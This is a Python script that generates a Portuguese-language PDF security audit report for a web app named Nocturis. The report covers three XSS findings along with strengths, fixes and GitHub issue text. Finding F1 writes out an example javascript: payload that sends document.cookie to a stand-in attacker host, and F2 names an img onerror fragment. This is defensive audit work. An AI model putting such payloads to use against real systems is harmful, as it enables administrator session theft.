#!/usr/bin/env python3
"""Gera o relatório de auditoria de segurança do Nocturis em PDF.

Uso: python3 gerar_relatorio.py
Dependências (venv): reportlab, matplotlib
"""
import os
from datetime import date
from xml.sax.saxutils import escape as _xml_escape


def esc(texto):
    """Escapa &, < e > pra texto dinâmico não ser interpretado como markup do reportlab."""
    return _xml_escape(str(texto))


def code_html(texto):
    return esc(texto).replace("\n", "<br/>").replace(" ", "&nbsp;")


def prose_block_html(texto):
    """Escapa e preserva quebras de linha, mas deixa os espaços normais pra reportlab
    poder quebrar a linha por palavra (evita corte no meio de palavra em texto corrido
    longo, ao contrário de code_html que fixa tudo com &nbsp; pra blocos de código curtos)."""
    return esc(texto).replace("\n", "<br/>")

import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt

from reportlab.lib import colors
from reportlab.lib.pagesizes import A4
from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
from reportlab.lib.units import cm
from reportlab.lib.enums import TA_LEFT, TA_CENTER
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image,
    PageBreak, KeepTogether, HRFlowable,
)
from reportlab.pdfgen import canvas as pdfcanvas

HERE = os.path.dirname(os.path.abspath(__file__))
OUT_PDF = os.path.join(HERE, "relatorio-auditoria-seguranca.pdf")
CHART_DONUT = os.path.join(HERE, "_chart_donut.png")
CHART_BAR = os.path.join(HERE, "_chart_bar.png")

# ---------------------------------------------------------------- paleta ---
COR = {
    "critica": "#B91C1C",
    "alta": "#EA580C",
    "media": "#D97706",
    "baixa": "#2563EB",
    "ponto_forte": "#059669",
    "texto": "#1F2937",
    "texto_suave": "#4B5563",
    "fundo_code": "#F3F4F6",
    "borda_code": "#D1D5DB",
}

REPORT_TITLE = "Relatório de Auditoria de Segurança — Nocturis"

# ---------------------------------------------------------------- dados ----
CATEGORIAS = [
    ("1. Banco sem tranca (isolamento por usuário)", 0),
    ("2. Permissão definida no navegador", 0),
    ("3. IDOR", 0),
    ("4. Chaves expostas (hardcode)", 0),
    ("5. Inputs sem tratamento (XSS)", 3),
]

FINDINGS = [
    {
        "id": "F1",
        "severidade": "alta",
        "categoria": "5. Inputs sem tratamento (XSS)",
        "titulo": "Injeção de URL javascript: no link \"Ver prova\" do painel de denúncias",
        "arquivos": [
            ("frontend/src/features/admin/AdminDenunciasPage.jsx", "105"),
            ("backend/src/routes/denuncias.js", "16, 22-31"),
        ],
        "trecho": (
            "// AdminDenunciasPage.jsx:105\n"
            '<a href={d.provaUrl} target="_blank" rel="noreferrer">\n'
            "  Ver prova\n"
            "</a>\n\n"
            "// denuncias.js:16-31 (POST /denuncias)\n"
            "const { alvoId, descricao, provaUrl } = req.body;\n"
            "...\n"
            "const denuncia = {\n"
            "  ...\n"
            "  provaUrl: provaUrl || null,   // sem validar esquema/formato\n"
            "  ...\n"
            "};"
        ),
        "explicacao": (
            "Qualquer usuário autenticado com papel cliente ou advogado pode registrar uma "
            "denúncia (POST /denuncias) e preencher provaUrl com texto arbitrário — o backend "
            "grava o valor sem checar se é uma URL http(s) válida. O painel administrativo "
            "renderiza esse valor direto num atributo href. Um valor como "
            "javascript:fetch('https://atacante.exemplo/x?c='+document.cookie) faz o navegador "
            "do administrador executar o script quando ele clica em \"Ver prova\" para revisar "
            "a denúncia — um fluxo que o próprio admin é instruído a fazer."
        ),
        "impacto": (
            "Execução de JavaScript arbitrário no contexto autenticado de um administrador. "
            "Como o token de sessão fica acessível ao JS da página (auth.currentUser do "
            "Firebase), isso permite roubo de sessão administrativa e ações privilegiadas em "
            "nome do admin (suspender/remover usuários, aprovar OAB, etc.)."
        ),
        "condicoes": (
            "Requer que o administrador clique no link \"Ver prova\" de uma denúncia "
            "maliciosa. Não requer nenhuma feature flag nem configuração insegura — o campo "
            "provaUrl é aceito e exibido por padrão."
        ),
        "correcao": (
            "No backend, validar que provaUrl começa com http:// ou https:// antes de salvar "
            "(rejeitar outros esquemas). No frontend, validar de novo antes de renderizar "
            "(defesa em profundidade) e/ou usar rel=\"noopener noreferrer\" combinado com um "
            "allowlist de esquema."
        ),
    },
    {
        "id": "F2",
        "severidade": "media",
        "categoria": "5. Inputs sem tratamento (XSS)",
        "titulo": "Nome do usuário interpolado sem escape no HTML do e-mail de notificação",
        "arquivos": [
            ("backend/src/lib/emailTemplates.js", "42-43, 75, 82"),
            ("backend/src/routes/auth.js", "13, 18-20, 41"),
        ],
        "trecho": (
            "// auth.js:13-20 (POST /auth/completar-cadastro)\n"
            "const { role, nome, telefone, ... } = req.body;\n"
            "...\n"
            'if (!nome) {\n'
            '  return res.status(400).json({ erro: "Nome é obrigatório" });\n'
            "}\n"
            "// nenhuma outra validação de formato/tamanho/caracteres em `nome`\n\n"
            "// emailTemplates.js:42-43,75,82\n"
            "export function templateNovaResposta({ advogadoNome, ... }) {\n"
            '  const nome = advogadoNome || "Um advogado";\n'
            "  return `...\n"
            "    <strong>${nome}</strong> respondeu você\n"
            "    ...\n"
            "    Tem uma mensagem nova esperando na sua conversa com ${nome} na Nocturis.\n"
            "  ...`;\n"
            "}"
        ),
        "explicacao": (
            "O campo nome é gravado sem sanitização no cadastro (diferente de bio, que é "
            "cortado em 240 caracteres, e comentario de feedback, cortado em 500). Quando um "
            "advogado responde no chat, o backend monta um e-mail HTML pro cliente "
            "concatenando esse nome direto na string, sem escapar caracteres como < > \" — "
            "diferente do frontend em React, que escapa automaticamente."
        ),
        "impacto": (
            "Um advogado malicioso pode cadastrar um nome contendo marcação HTML (links "
            "falsos, formatação para phishing, tags que quebram o layout do e-mail) que será "
            "entregue, sem filtro, na caixa de entrada de qualquer cliente que ele responder "
            "no chat. Dependendo do cliente de e-mail do destinatário, tags ativas (ex.: "
            "<img onerror=...>) também podem ser processadas."
        ),
        "condicoes": (
            "Só é acionado quando o advogado com o nome malicioso responde uma mensagem no "
            "chat (envio de e-mail já é condicional a isso). Não depende de nenhuma "
            "configuração além de RESEND_API_KEY estar configurada (sem ela o e-mail nem sai, "
            "mas isso não é uma mitigação, é um efeito colateral do ambiente)."
        ),
        "correcao": (
            "Escapar entidades HTML (<, >, &, \", ') em todo valor interpolado dentro de "
            "templates de e-mail (nome, e qualquer outro campo de usuário usado no futuro), "
            "e/ou validar e sanitizar o campo nome no cadastro (permitir só letras, espaços e "
            "pontuação básica de nome próprio)."
        ),
    },
    {
        "id": "F3",
        "severidade": "baixa",
        "categoria": "5. Inputs sem tratamento (XSS)",
        "titulo": "Upload de foto de perfil aceita SVG (pode conter script embutido)",
        "arquivos": [
            ("backend/src/routes/advogados.js", "14-23"),
        ],
        "trecho": (
            "const uploadFoto = multer({\n"
            "  storage: multer.memoryStorage(),\n"
            "  limits: { fileSize: 5 * 1024 * 1024 },\n"
            "  fileFilter: (_req, file, cb) => {\n"
            '    if (!file.mimetype.startsWith("image/")) {\n'
            '      return cb(new Error("Envie um arquivo de imagem"));\n'
            "    }\n"
            "    cb(null, true);\n"
            "  },\n"
            '}).single("foto");'
        ),
        "explicacao": (
            "O filtro aceita qualquer mimetype que comece com image/, incluindo "
            "image/svg+xml. Um arquivo SVG pode conter <script> embutido. Hoje o valor salvo "
            "(foto) só é renderizado via <img src={foto}> no componente Avatar (frontend/src/"
            "components/Avatar/Avatar.jsx) — confirmado em todos os pontos de uso — e "
            "navegadores não executam script de SVG carregado dentro de <img>, então não há "
            "caminho de exploração ativo hoje no frontend atual."
        ),
        "impacto": (
            "Sem exploração ativa nas telas atuais. O risco é latente: se qualquer tela "
            "futura abrir a URL da foto diretamente (nova aba, <iframe>, download com "
            "abertura automática) ou se a política do provedor de armazenamento de imagem "
            "mudar, o mesmo arquivo já poderia se tornar explorável sem precisar reenviar nada."
        ),
        "condicoes": (
            "Não explorável nas telas atuais (confirmado: foto só é usada via <img> em "
            "AdvogadoCard, AdvogadoPublicoPage, ContatoAdvogadoPage, cartão de "
            "compartilhamento e páginas de admin/perfil). Passaria a ser explorável apenas "
            "com uma mudança futura de código que abra a URL como documento de nível "
            "superior."
        ),
        "correcao": (
            "Restringir fileFilter a uma lista explícita de formatos raster "
            "(image/jpeg, image/png, image/webp), rejeitando image/svg+xml e outros "
            "formatos que podem conter conteúdo ativo."
        ),
    },
]

PONTOS_FORTES = [
    (
        "1. Isolamento por usuário",
        "O Admin SDK do Firebase (usado pelo backend) ignora as regras do Firestore por "
        "design — o documento de regras (database/firestore.rules) já registra isso em "
        "comentário e nega tudo por padrão como segunda camada. A camada real de isolamento "
        "é o filtro manual por uid nas rotas Express. Percorridas todas as rotas que "
        "listam/buscam dados por usuário: GET /users/me, GET /contatos/meus, GET /denuncias/"
        "minhas, GET /triagem/historico, GET /triagem/:id, GET /conversas/minhas e GET/POST "
        "/conversas/:comUid/mensagens filtram consistentemente por req.user.uid (via campo "
        "clienteId/advogadoId ou via ID composto do documento). Nenhuma dessas rotas aceita "
        "um identificador de outro usuário sem also exigir que req.user.uid seja uma das "
        "partes.",
    ),
    (
        "2. Permissão no servidor",
        "Toda rota que corresponde a uma ação restrita por papel no frontend (área de admin, "
        "edição de perfil de advogado, moderação de denúncias, triagem, chat) tem o "
        "middleware requireRole(...) equivalente no backend (backend/src/middlewares/"
        "auth.js). Rotas cruzadas uma a uma: /admin/advogados, /admin/denuncias, /admin/"
        "users/:uid/suspender, DELETE /admin/users/:uid, PATCH /advogados/:uid/verificar → "
        "todas exigem requireRole(\"admin\"). Não existe nenhuma rota de escrita sensível "
        "sem verificarToken + requireRole correspondente.",
    ),
    (
        "3. Ausência de IDOR",
        "Todas as rotas que recebem :uid/:id no path e alteram ou retornam dado privado "
        "conferem posse antes de agir: PUT /advogados/:uid, POST /advogados/:uid/foto, PUT "
        "/curriculos/:uid e GET /advogados/:uid/metricas comparam uid === req.user.uid (ou "
        "papel admin); PATCH/DELETE /contatos/meus/:advogadoId usam um ID de documento "
        "composto que já embute req.user.uid, tornando impossível referenciar o contato de "
        "outro cliente; GET /triagem/:id confere triagem.clienteId === req.user.uid antes de "
        "devolver dado. As únicas rotas por :uid sem checagem de posse (GET /advogados/:uid, "
        "GET /curriculos/:uid) são intencionalmente públicas — perfil e currículo de "
        "advogado são dados de divulgação profissional.",
    ),
    (
        "4. Sem segredo exposto",
        "Nenhuma chave de API, token, senha ou credencial foi encontrada hardcoded no "
        "código-fonte, configs, ou histórico do git (busca por padrões de chave conhecidos "
        "e por nomes de arquivo como service-account.json/.env não retornou nada). Todos os "
        "segredos (GEMINI_API_KEY, GROQ_API_KEY, RESEND_API_KEY, CLOUDINARY_*, "
        "GOOGLE_APPLICATION_CREDENTIALS) são lidos só de variável de ambiente, sem valor "
        "default que resolva pra um segredo real — no pior caso (RESEND_FROM) o default é "
        "só um endereço de e-mail, não um segredo. As chaves do Firebase Web "
        "(VITE_FIREBASE_API_KEY etc.) aparecem no bundle do frontend, mas isso é esperado e "
        "documentado no próprio firestore.rules: chave web do Firebase é pública por design, "
        "quem protege os dados são as regras/backend, não o sigilo da chave.",
    ),
]

RECOMENDACOES = [
    ("P1", "F1", "Validar esquema de provaUrl (só http/https) no backend antes de salvar, e revalidar no frontend antes de renderizar o link."),
    ("P2", "F2", "Escapar HTML de todo campo de usuário usado em templates de e-mail; sanitizar/limitar o campo nome no cadastro."),
    ("P3", "F3", "Restringir upload de foto a formatos raster (jpeg/png/webp), removendo image/svg+xml do fileFilter."),
]

ISSUES_MD = []

def _issue_md(f, numero):
    sev_label = {"critica": "critical", "alta": "high", "media": "medium", "baixa": "low"}[f["severidade"]]
    arquivos_txt = "\n".join(f"- `{caminho}:{linhas}`" for caminho, linhas in f["arquivos"])
    checklist = {
        "F1": (
            "- [ ] Backend rejeita valores de `provaUrl` que não comecem com `http://` ou `https://`\n"
            "- [ ] Frontend não renderiza `href` com esquema fora do allowlist\n"
            "- [ ] Teste automatizado cobrindo uma tentativa de `provaUrl: \"javascript:...\"`"
        ),
        "F2": (
            "- [ ] Toda interpolação em `emailTemplates.js` passa por uma função de escape de HTML\n"
            "- [ ] Campo `nome` no cadastro tem validação de formato (sem tags/caracteres de marcação)\n"
            "- [ ] Teste automatizado cobrindo um `nome` com `<img onerror=...>` no e-mail gerado"
        ),
        "F3": (
            "- [ ] `fileFilter` do multer aceita só `image/jpeg`, `image/png` e `image/webp`\n"
            "- [ ] Upload de um arquivo `.svg` retorna erro 400\n"
            "- [ ] Teste automatizado cobrindo rejeição de `image/svg+xml`"
        ),
    }[f["id"]]
    corpo = f"""[Segurança] {f['titulo']}

Labels sugeridas: security, {sev_label}

## Descrição do problema
{f['explicacao']}

## Por que é explorável
{f['condicoes']}

## Evidência
Arquivos:
{arquivos_txt}

```
{f['trecho']}
```

## Impacto
{f['impacto']}

## Sugestão de correção
{f['correcao']}

## Critérios de aceite
{checklist}
"""
    return corpo


for i, f in enumerate(FINDINGS, start=1):
    ISSUES_MD.append((i, _issue_md(f, i)))

# ---------------------------------------------------------------- gráficos --
def gerar_graficos():
    sev_count = {"Alta": 0, "Média": 0, "Baixa": 0, "Crítica": 0}
    key_map = {"critica": "Crítica", "alta": "Alta", "media": "Média", "baixa": "Baixa"}
    for f in FINDINGS:
        sev_count[key_map[f["severidade"]]] += 1
    sev_count = {k: v for k, v in sev_count.items() if v > 0}

    cores_sev = {"Crítica": COR["critica"], "Alta": COR["alta"], "Média": COR["media"], "Baixa": COR["baixa"]}

    fig, ax = plt.subplots(figsize=(4.2, 4.2), dpi=200)
    labels = list(sev_count.keys())
    valores = list(sev_count.values())
    cores = [cores_sev[l] for l in labels]
    wedges, texts, autotexts = ax.pie(
        valores, labels=labels, colors=cores, autopct=lambda p: f"{round(p/100*sum(valores))}",
        startangle=90, pctdistance=0.78,
        wedgeprops=dict(width=0.42, edgecolor="white", linewidth=2),
        textprops={"fontsize": 11, "color": COR["texto"]},
    )
    for at in autotexts:
        at.set_color("white")
        at.set_fontweight("bold")
        at.set_fontsize(12)
    ax.set_title("Achados por severidade", fontsize=13, color=COR["texto"], pad=14)
    fig.tight_layout()
    fig.savefig(CHART_DONUT, transparent=True)
    plt.close(fig)

    fig, ax = plt.subplots(figsize=(6.4, 3.6), dpi=200)
    nomes = [c[0].split(". ", 1)[1] for c in CATEGORIAS]
    valores = [c[1] for c in CATEGORIAS]
    barras = ax.barh(nomes, valores, color=[COR["ponto_forte"] if v == 0 else COR["alta"] for v in valores])
    for barra, v in zip(barras, valores):
        ax.text(v + 0.05, barra.get_y() + barra.get_height() / 2, str(v),
                va="center", fontsize=10, color=COR["texto"])
    ax.set_xlim(0, max(valores) + 1)
    ax.set_xlabel("Número de achados", fontsize=10, color=COR["texto_suave"])
    ax.set_title("Achados por categoria", fontsize=13, color=COR["texto"], pad=12)
    ax.spines["top"].set_visible(False)
    ax.spines["right"].set_visible(False)
    ax.tick_params(colors=COR["texto"], labelsize=9)
    fig.tight_layout()
    fig.savefig(CHART_BAR, transparent=True)
    plt.close(fig)


# ---------------------------------------------------------------- estilos --
styles = getSampleStyleSheet()
styles.add(ParagraphStyle("TituloCapa", fontSize=22, leading=27, fontName="Helvetica-Bold",
                           textColor=colors.HexColor(COR["texto"]), spaceAfter=6))
styles.add(ParagraphStyle("SubCapa", fontSize=12, leading=16, textColor=colors.HexColor(COR["texto_suave"])))
styles.add(ParagraphStyle("H1", fontSize=16, leading=20, fontName="Helvetica-Bold",
                           textColor=colors.HexColor(COR["texto"]), spaceBefore=14, spaceAfter=8))
styles.add(ParagraphStyle("H2", fontSize=12.5, leading=16, fontName="Helvetica-Bold",
                           textColor=colors.HexColor(COR["texto"]), spaceBefore=10, spaceAfter=4))
styles.add(ParagraphStyle("Corpo", fontSize=9.6, leading=14, fontName="Helvetica",
                           textColor=colors.HexColor(COR["texto"]), spaceAfter=6, alignment=TA_LEFT))
styles.add(ParagraphStyle("CorpoSuave", fontSize=9.2, leading=13, fontName="Helvetica",
                           textColor=colors.HexColor(COR["texto_suave"])))
styles.add(ParagraphStyle("CodeBlock", fontSize=7.6, leading=10.5, fontName="Courier",
                           textColor=colors.HexColor("#111827"), backColor=colors.HexColor(COR["fundo_code"]),
                           borderColor=colors.HexColor(COR["borda_code"]), borderWidth=0.6,
                           borderPadding=6, spaceAfter=8))
styles.add(ParagraphStyle("Chip", fontSize=8.5, leading=11, fontName="Helvetica-Bold",
                           textColor=colors.white, alignment=TA_CENTER))
styles.add(ParagraphStyle("TableCell", fontSize=8.4, leading=11, fontName="Helvetica",
                           textColor=colors.HexColor(COR["texto"])))
styles.add(ParagraphStyle("IssueMono", fontSize=7.4, leading=10, fontName="Courier",
                           textColor=colors.HexColor("#111827"), backColor=colors.HexColor("#F9FAFB"),
                           borderColor=colors.HexColor(COR["borda_code"]), borderWidth=0.6, borderPadding=8))


def chip(texto, cor_hex):
    t = Table([[Paragraph(texto.upper(), styles["Chip"])]], colWidths=[2.6 * cm])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, -1), colors.HexColor(cor_hex)),
        ("TOPPADDING", (0, 0), (-1, -1), 3),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 3),
        ("ROUNDEDCORNERS", [4, 4, 4, 4]),
    ]))
    return t


def cor_severidade(sev):
    return COR.get(sev, COR["texto_suave"])


# ---------------------------------------------------------------- header/footer --
def header_footer(c: pdfcanvas.Canvas, doc):
    c.saveState()
    largura, altura = A4
    c.setFont("Helvetica", 8)
    c.setFillColor(colors.HexColor(COR["texto_suave"]))
    c.drawString(2 * cm, altura - 1.3 * cm, REPORT_TITLE)
    c.drawRightString(largura - 2 * cm, 1.2 * cm, f"Página {doc.page}")
    c.setStrokeColor(colors.HexColor(COR["borda_code"]))
    c.line(2 * cm, altura - 1.5 * cm, largura - 2 * cm, altura - 1.5 * cm)
    c.line(2 * cm, 1.5 * cm, largura - 2 * cm, 1.5 * cm)
    c.restoreState()


def build():
    gerar_graficos()
    doc = SimpleDocTemplate(
        OUT_PDF, pagesize=A4,
        leftMargin=2 * cm, rightMargin=2 * cm, topMargin=2.2 * cm, bottomMargin=2 * cm,
        title=REPORT_TITLE, author="Auditoria de Segurança",
    )
    story = []

    # ---------- Capa ----------
    story.append(Spacer(1, 3 * cm))
    story.append(Paragraph(REPORT_TITLE, styles["TituloCapa"]))
    story.append(Paragraph(f"Data: {date.today().strftime('%d/%m/%Y')}", styles["SubCapa"]))
    story.append(Spacer(1, 0.6 * cm))
    story.append(Paragraph(
        "Escopo auditado: repositório curupacu/Noctirus — backend Node.js/Express "
        "(Firebase Admin SDK, sem ORM tradicional; o Firestore é o banco de dados) e "
        "frontend React 19 + Vite. Deploy: Render (backend) e Firebase Hosting (frontend); "
        "CI em GitHub Actions. Sem Docker, Helm ou Terraform no repositório.",
        styles["Corpo"],
    ))
    story.append(Spacer(1, 0.4 * cm))
    story.append(Paragraph("Nota metodológica — mapeamento por categoria", styles["H2"]))
    nota = [
        ("Isolamento por usuário", "O Nocturis não usa RLS do Supabase. O equivalente é: Firestore Security Rules "
         "(database/firestore.rules, negando tudo por padrão) como segunda camada, e verificação manual por "
         "req.user.uid em cada rota Express como camada real de enforcement, já que o Admin SDK do backend "
         "ignora as regras do Firestore."),
        ("Permissão no navegador", "Mapeado para: gates de papel no frontend React (ex.: rotas protegidas por "
         "papel) cruzados com o middleware requireRole(...) equivalente em cada rota do Express."),
        ("IDOR", "Percorridos sistematicamente todos os handlers de rota em backend/src/routes/*.js que recebem "
         ":id/:uid, verificando posse antes de ler, alterar ou apagar o recurso."),
        ("Chaves expostas", "Busca por padrões de chave/segredo no código-fonte, configs e histórico do git, "
         "mais inspeção manual de backend/src/lib e dos arquivos .env.example."),
        ("Inputs sem tratamento", "Mapeado para: dangerouslySetInnerHTML/innerHTML/eval no frontend React, "
         "atributos href/src com dado de usuário, e interpolação de dado de usuário em HTML gerado no backend "
         "(templates de e-mail)."),
    ]
    for titulo, texto in nota:
        story.append(Paragraph(f"<b>{esc(titulo)}.</b> {esc(texto)}", styles["CorpoSuave"]))
        story.append(Spacer(1, 0.15 * cm))

    story.append(PageBreak())

    # ---------- Resumo executivo ----------
    story.append(Paragraph("Resumo executivo", styles["H1"]))
    total = len(FINDINGS)
    por_sev = {}
    for f in FINDINGS:
        por_sev[f["severidade"]] = por_sev.get(f["severidade"], 0) + 1
    resumo_txt = (
        f"Foram verificados {total} achados de segurança, todos na categoria 5 (inputs sem "
        f"tratamento). As categorias 1 a 4 — isolamento por usuário, permissão definida no "
        f"navegador, IDOR e chaves expostas — não apresentaram nenhuma falha verificável após "
        f"revisão sistemática de todos os handlers de rota do backend; os pontos fortes "
        f"encontrados estão detalhados na próxima seção."
    )
    story.append(Paragraph(resumo_txt, styles["Corpo"]))

    tabela_resumo = [["Severidade", "Quantidade"]]
    ordem_sev = ["critica", "alta", "media", "baixa"]
    label_sev = {"critica": "Crítica", "alta": "Alta", "media": "Média", "baixa": "Baixa"}
    for s in ordem_sev:
        if por_sev.get(s):
            tabela_resumo.append([label_sev[s], str(por_sev[s])])
    t = Table(tabela_resumo, colWidths=[6 * cm, 4 * cm])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#111827")),
        ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, -1), 9.5),
        ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor(COR["borda_code"])),
        ("TOPPADDING", (0, 0), (-1, -1), 5),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
    ]))
    story.append(Spacer(1, 0.3 * cm))
    story.append(t)
    story.append(Spacer(1, 0.4 * cm))

    imgs = Table([[Image(CHART_DONUT, width=7.2 * cm, height=7.2 * cm),
                   Image(CHART_BAR, width=9.6 * cm, height=5.4 * cm)]],
                 colWidths=[7.4 * cm, 9.8 * cm])
    imgs.setStyle(TableStyle([("VALIGN", (0, 0), (-1, -1), "MIDDLE")]))
    story.append(imgs)
    story.append(PageBreak())

    # ---------- Pontos fortes / fracos ----------
    story.append(Paragraph("Pontos fortes", styles["H1"]))
    for titulo, texto in PONTOS_FORTES:
        story.append(Paragraph(f"<font color='{COR['ponto_forte']}'>&#9679;</font> <b>{esc(titulo)}</b>", styles["H2"]))
        story.append(Paragraph(esc(texto), styles["Corpo"]))

    story.append(Spacer(1, 0.3 * cm))
    story.append(Paragraph("Pontos fracos (riscos centrais)", styles["H1"]))
    for f in FINDINGS:
        cor = cor_severidade(f["severidade"])
        linha = Table([[chip(f["severidade"], cor), Paragraph(f"<b>{esc(f['titulo'])}</b>", styles["Corpo"])]],
                       colWidths=[3 * cm, 13.5 * cm])
        linha.setStyle(TableStyle([("VALIGN", (0, 0), (-1, -1), "MIDDLE")]))
        story.append(linha)
        story.append(Spacer(1, 0.15 * cm))

    story.append(PageBreak())

    # ---------- Achados detalhados ----------
    story.append(Paragraph("Achados detalhados", styles["H1"]))
    for f in FINDINGS:
        cor = cor_severidade(f["severidade"])
        bloco = []
        bloco.append(Table(
            [[chip(f["severidade"], cor), Paragraph(f"<b>{esc(f['id'])} — {esc(f['titulo'])}</b>", styles["H2"])]],
            colWidths=[3 * cm, 13.5 * cm],
            style=TableStyle([("VALIGN", (0, 0), (-1, -1), "MIDDLE")]),
        ))
        arquivos_txt = "<br/>".join(f"<font face='Courier' size='8'>{esc(c)}:{esc(l)}</font>" for c, l in f["arquivos"])
        bloco.append(Paragraph(f"<b>Arquivo:linha</b><br/>{arquivos_txt}", styles["Corpo"]))
        bloco.append(Paragraph(code_html(f["trecho"]), styles["CodeBlock"]))
        bloco.append(Paragraph(f"<b>Por que é explorável:</b> {esc(f['explicacao'])}", styles["Corpo"]))
        bloco.append(Paragraph(f"<b>Impacto:</b> {esc(f['impacto'])}", styles["Corpo"]))
        bloco.append(Paragraph(f"<b>Condições de explorabilidade:</b> {esc(f['condicoes'])}", styles["Corpo"]))
        bloco.append(Paragraph(f"<b>Sugestão de correção:</b> {esc(f['correcao'])}", styles["Corpo"]))
        bloco.append(Spacer(1, 0.35 * cm))
        story.append(KeepTogether(bloco))

    story.append(PageBreak())

    # ---------- Recomendações ----------
    story.append(Paragraph("Recomendações priorizadas", styles["H1"]))
    tabela_rec = [["Prioridade", "Achado", "Ação"]]
    for p, fid, acao in RECOMENDACOES:
        tabela_rec.append([p, fid, Paragraph(acao, styles["TableCell"])])
    t = Table(tabela_rec, colWidths=[2.4 * cm, 2 * cm, 12.1 * cm])
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#111827")),
        ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, -1), 9),
        ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor(COR["borda_code"])),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("TOPPADDING", (0, 0), (-1, -1), 5),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
    ]))
    story.append(t)
    story.append(PageBreak())

    # ---------- Issues pro GitHub ----------
    story.append(Paragraph("Issues para o GitHub", styles["H1"]))
    story.append(Paragraph(
        "Texto completo em Markdown, pronto para copiar e colar na criação de cada issue.",
        styles["CorpoSuave"],
    ))
    story.append(Spacer(1, 0.2 * cm))
    for numero, md in ISSUES_MD:
        story.append(Paragraph(f"--- ISSUE {numero} ---", styles["H2"]))
        story.append(Paragraph(prose_block_html(md), styles["IssueMono"]))
        story.append(Paragraph(f"--- FIM ISSUE {numero} ---", styles["CorpoSuave"]))
        story.append(Spacer(1, 0.4 * cm))

    doc.build(story, onFirstPage=header_footer, onLaterPages=header_footer)
    print("PDF gerado em", OUT_PDF)


if __name__ == "__main__":
    build()
